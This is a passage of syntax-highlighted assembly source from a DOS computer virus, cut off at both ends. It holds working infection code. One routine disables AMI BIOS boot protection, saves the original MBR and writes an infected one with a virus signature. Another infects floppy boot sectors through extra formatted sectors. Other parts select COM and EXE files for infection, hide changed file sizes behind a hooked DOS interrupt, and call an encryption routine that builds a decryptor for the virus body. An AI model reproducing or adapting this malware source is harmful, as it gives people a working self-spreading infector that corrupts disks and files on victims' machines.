                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0adh</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">                  </span><span class="sc1">; ami shadowing and boot pwd</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc0">                  </span><span class="sc1">; disable it</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; store keystroke in kbd buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1579h</span><span class="sc0">                </span><span class="sc1">; 'y'</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">16h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seg_bx_tspace</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; save old MBR to 0,0,3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_mbrinfect</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; some random bytes on the</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; background</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1feh</span><span class="sc4">],</span><span class="sc2">0aa55h</span><span class="sc0">  </span><span class="sc1">; valid boot marker</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">generic_boot</span><span class="sc0">  </span><span class="sc1">; copy generic boot part</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">generic_boot_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">generic_boot</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mbr_part</span><span class="sc0">      </span><span class="sc1">; and mbr booting part</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mbr_part_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mbr_part</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy virus signature</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">                     </span><span class="sc1">; write new enhanched MBR :)</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_mbrinfect</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; virus on hd starts from 4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">oligo_write_fbhd</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc5">exit_mbrinfect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">                  </span><span class="sc1">; ami shadowing and boot pwd</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; restore previous status</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0adh</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; restore this as well.</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">infect_floppy</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1eh</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; point ES:BX to diskette param</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0a02h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; set bytes per sector to 512h</span><span class="sc0">
                                                </span><span class="sc1">; and sector per track to 0ah</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">   </span><span class="sc1">; set gap lenght for format to</span><span class="sc0">
                                                </span><span class="sc1">; 50h, that is the one for 5'25</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seg_bx_tspace</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">509h</span><span class="sc0">                 </span><span class="sc1">; format 9 extra sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">format_table</span><span class="sc0">  </span><span class="sc1">; to format address field buf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5101h</span><span class="sc0">                </span><span class="sc1">; starting track</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">somdown</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; save original boot sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">somdown</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">5eebh</span><span class="sc0">          </span><span class="sc1">; jmp short to offset</span><span class="sc0">
                                                        </span><span class="sc1">; 60h in boot</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; at offset 60h in boot</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">generic_boot</span><span class="sc0">          </span><span class="sc1">; first generic boot</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">generic_boot_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">generic_boot</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">floppy_part</span><span class="sc0">           </span><span class="sc1">; then floppy part</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">floppy_part_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">floppy_part</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; put virus name as</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_name</span><span class="sc0">            </span><span class="sc1">; marker too in boot</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; write new boot sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">somdown</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5101h</span><span class="sc0">                </span><span class="sc1">; where it will be placed</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">oligo_write_fbhd</span><span class="sc0">
</span><span class="sc5">somdown</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; restore diskette parameters</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">oligo_write_fbhd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; this setups the registers for writing to hd or floppy in the write_to_disk</span><span class="sc0">
</span><span class="sc1">; routine and then calls the routine that creates the decryptor and encrypts</span><span class="sc0">
</span><span class="sc1">; the virus body. after that the virus is written starting from the wanted</span><span class="sc0">
</span><span class="sc1">; sector (this is CX in input to this routine) + 1</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">what_call</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">write_to_disk</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">value_cx</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">value_dx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">real_start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">oligo_algo</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">; sets CS=DS=ES and points BX to temporary space after virus body</span><span class="sc0">
</span><span class="sc5">seg_bx_tspace</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; close file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">chk_extsuch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_fileis_np</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">bad_fileis_np</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">200d</span><span class="sc0">       </span><span class="sc1">; file date check</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_ifclose</span><span class="sc0">                   </span><span class="sc1">; is a close call?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_dotcom</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; on +2 open mode</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_fileis</span><span class="sc0">                      </span><span class="sc1">; no 011b, dos internal</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0f8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; make it read-write</span><span class="sc0">
</span><span class="sc5">check_dotcom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">       </span><span class="sc1">; check if .COM</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_dotexe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2ah</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_fileis</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                              </span><span class="sc1">; SI = 1 for coms</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">good_exitchk</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">check_dotexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">       </span><span class="sc1">; check if .EXE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_fileis</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2ah</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_fileis</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                              </span><span class="sc1">; SI = 2 for exes</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">good_exitchk</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">bad_fileis</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">bad_fileis_np</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">dont_correct_after</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back_inf_w24</span><span class="sc0">
</span><span class="sc5">pre_21h_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">                    </span><span class="sc1">; mov ax,</span><span class="sc0">
</span><span class="sc5">func_21h</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">4b00h</span><span class="sc0">                   </span><span class="sc1">; stored called int21h func</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">dont_correct_after</span><span class="sc0">      </span><span class="sc1">; if function different than</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; 3dh and 6ch then just</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; restore int24h header and</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; exit, else sft size</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; stealth</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">                     </span><span class="sc1">; call original int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">error_21hl</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_nostealth</span><span class="sc0">         </span><span class="sc1">; if zip or backup running</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_stealth_1</span><span class="sc0">            </span><span class="sc1">; don't stealth</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
